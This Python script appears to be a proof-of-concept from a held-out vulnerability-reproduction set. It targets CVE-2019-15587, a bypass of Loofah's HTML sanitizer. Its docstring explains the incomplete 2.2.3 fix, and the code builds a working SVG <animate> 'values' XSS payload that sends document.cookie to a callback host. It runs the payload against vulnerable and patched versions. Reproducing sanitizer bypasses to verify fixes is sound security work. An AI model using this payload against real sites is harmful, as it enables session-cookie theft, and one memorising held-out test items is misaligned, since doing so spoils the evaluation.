#!/usr/bin/env python3
"""[HELD-OUT] CVE-2019-15587 residual -- the SVG <animate> `values`-attribute javascript: smuggling
that bypasses the CVE-2018-16468 (loofah 2.2.3) fix.

Same sink (Loofah sanitize+republish), same exfil channel as the seed. The 2.2.3 fix (commit
71e4b54) removed ONLY `from` from the SVG-attribute allowlist; the sibling animation value
attributes `to`, `by`, and especially `values` stayed allowed. So the SAME class of attack --
smuggle a `javascript:` URI into an <animate> value that sets an SVG <a>'s href -- still works,
just carried in `values` instead of `from`:

    <svg><animate href="#foo" attributeName="href" values="javascript:..."/><a id="foo"><circle r=400/></a></svg>

Loofah 2.2.3 keeps `values` (verified server-side), the republished output still contains the live
javascript: URI, and clicking the animated link executes it -> flag exfiltrated. The 2.2.3 fix never
covered to/by/values -> INCOMPLETE FIX (CVE-2019-15587, GHSA-c3gv-9cxf-6f57).

On V2 (loofah 2.3.1, the CVE-2019-15587 fix) commit 0c6617a removed `by`, `to`, AND `values` from
the SVG-attribute allowlist, so the `values` URI is stripped from the republished output -> click
does nothing -> BLOCKED. (This is the payload from the upstream regression test added in 0c6617a.)
"""
import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[1]))
from poc_common import run_payload, CB  # noqa: E402

# The CVE-2019-15587 regression-test payload, benign-canary variant: javascript: URI carried in the
# `values` attribute (which the 2.2.3 fix left allowed), reads document.cookie -> internal callback.
BYPASS_PAYLOAD = (
    '<svg>'
    '<animate href="#foo" attributeName="href" '
    "values=\"javascript:document.location='" + CB + "'+document.cookie\" />"
    '<a id="foo"><circle r="400" /></a>'
    "</svg>"
)


def bypass_poc(*, version="v1"):
    """Run the CVE2 `values`-attribute residual on `version`; return the callback dump (flag on V1)."""
    return run_payload(BYPASS_PAYLOAD, version, visit_mode="click")


if __name__ == "__main__":
    v = sys.argv[1] if len(sys.argv) > 1 else "v1"
    print(bypass_poc(version=v))
